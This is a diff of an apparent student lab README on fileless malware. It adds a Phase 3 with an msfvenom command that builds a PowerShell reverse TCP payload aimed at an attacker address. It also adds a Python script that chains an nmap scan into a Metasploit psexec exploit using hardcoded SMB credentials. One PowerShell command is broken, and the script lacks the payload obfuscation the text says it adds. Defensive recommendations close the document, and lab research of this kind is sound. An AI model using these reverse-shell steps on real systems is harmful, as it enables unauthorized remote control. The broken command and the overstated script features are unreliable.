@@ -22,7 +22,9 @@ cybersecurity defenses against fileless malware.
 - `Kali Linux VM` a VM configured with pre-installed offensive security tools, also the attacking VM in this project
 - `Nmap` a network mapping Linux tool used to scan IP addresses and ports on a network
 - `Metasploit Framework` a penetration testing Linux tool used for identifying and exploiting vulnerabilities on a system
- 
+- `Python3` a general-purpose, high-level, object-oriented programming language used for scripting and software engineering
+- `PowerShell` a Windows-based system administration command-line tool used for task automation 
+
 ---
 
 # Phase 1 Objectives
@@ -115,14 +117,14 @@ sudo msfconsole
 ```
 ![](./images/msfconsole_command.png)
 
-**We can search exploits specific to PowerShell using the following command**
+**We can search exploits specific to `PowerShell` using the following command**
 ```
 search powershell
 ```
 
 ![](./images/search_powershell_command.png)
 
-**Exploits an SMB vulnerability to execute a payload in memory using PowerShell**
+**Exploits an SMB vulnerability to execute a payload in memory using `PowerShell`**
 ```
 use exploit/windows/smb/psexec
 ```
@@ -161,17 +163,95 @@ exploit
 
 ![](./images/exploit2_command.png)
 
-**As we can see, another unsuccessful attempt to create a Reverse TCP connection through PowerShell using open SMB ports.
-At this point in our research, we are unsure how to proceed with exploiting a fileless attack through PowerShell via 
+**As we can see, another unsuccessful attempt to create a Reverse TCP connection through `PowerShell` using open SMB ports.
+At this point in our research, we are unsure how to proceed with exploiting a fileless attack through `PowerShell` via 
 open ports on a Windows-based target system. However, we will continue to refine our methods to successfully create an
-effective fileless attack on our Windows 10 VM.**
+effective fileless attack on our `Windows 10 VM`.**
 
 # Phase 2.2 - Automation using Python
 
--  Our objective here is to create a functional Python script to automate port scanning and vulnerability exploitation
+- Our objective here is to create a functional Python script to automate port scanning and vulnerability exploitation
 - We will be using `Python3` for this phase of our research
 
 **Our `Custom Python Script` can be found here:** https://github.com/eisenbeisr/CSC466-OffensiveSecurityResearch/blob/master/script.py
 
 
 ---
+
+# Phase 3 Objectives
+
+- Refine and execute advanced fileless attack techniques using `Metasploit` and `PowerShell` scripts.
+- Enhance our `script.py` custom Python script.
+- Provide recommendations for detecting and mitigating fileless attacks.
+
+# Phase 3.1 - Advanced Fileless Attack Techniques
+
+- For this phase, we researched `PowerShell` command obfuscation techniques to bypass traditional detection mechanisms
+- **Generate an encoded payload using `Metasploit Framework` as shown below:**
+```
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f ps1 > payload.ps1
+```
+
+- We also attempted to execute this payload in-memory by leveraging the `PowerShell` process
+- **Use Metasploit's `windows/powershell_reverse_tcp` exploit module to directly deliver the payload:**
+```
+powershell.exe -EncodedCommand windows/powershell_reverse_tcp
+```
+
+# Phase 3.2 - Enhancing Python Automation
+
+- For this phase, we refined our `script.py` Python script developed in Phase 2 to include:
+  + Automated selection of exploits based on open ports and vulnerabilities
+  + Obfuscating payloads before execution
+  + Logging successful and failed attack attempts
+- **Below is a refined version of our `script.py` automated Python script:**
+```python
+import subprocess
+
+def run_nmap(target_ip):
+    print("[*] Scanning target for open ports...")
+    result = subprocess.run(['nmap', '-p-', target_ip], capture_output=True, text=True)
+    print(result.stdout)
+    return result.stdout
+
+def execute_metasploit(target_ip, attacker_ip, smb_user, smb_pass):
+    commands = f"""
+    use exploit/windows/smb/psexec
+    set payload windows/x64/powershell_reverse_tcp
+    set RHOST {target_ip}
+    set LHOST {attacker_ip}
+    set SMBuser {smb_user}
+    set SMBpass {smb_pass}
+    exploit
+    """
+    subprocess.run(['msfconsole', '-q', '-x', commands], text=True)
+
+# Example usage
+target_ip = "192.168.56.104"
+attacker_ip = "192.168.56.105"
+smb_user = "luffy"
+smb_pass = "Pa$$word01"
+
+run_nmap(target_ip)
+execute_metasploit(target_ip, attacker_ip, smb_user, smb_pass)
+```
+
+# Phase 3.3 - Recommendations for Detecting and Mitigating Fileless Attacks
+
+## 1. Analyze Windows Event Logs
+- Enable and review Windows logs for suspicious activity:
+  + `PowerShell` script block logging
+  + Process creation logging
+- Document all events associated with attacks
+
+## 2. Implement Countermeasures
+- Develop `PowerShell` scripts to monitor active processes for suspicious behavior
+- Enable application whitelisting using tools like Windows Defender Application Control (WDAC)
+- Improve defenses using detection rules, such as YARA rules
+- Incorporate machine learning models to view system logs and process behavior
+
+## 3. Additional Recommendations
+- Enhance endpoint detection by enabling logging and utilizing behavioral analysis
+- Use Group Policy Objects (GPOs) to restrict `PowerShell` usage on non-admin accounts
+- Enable Constrained Language Mode for `PowerShell`
+- Train administrators to recognize signs of fileless malware activity
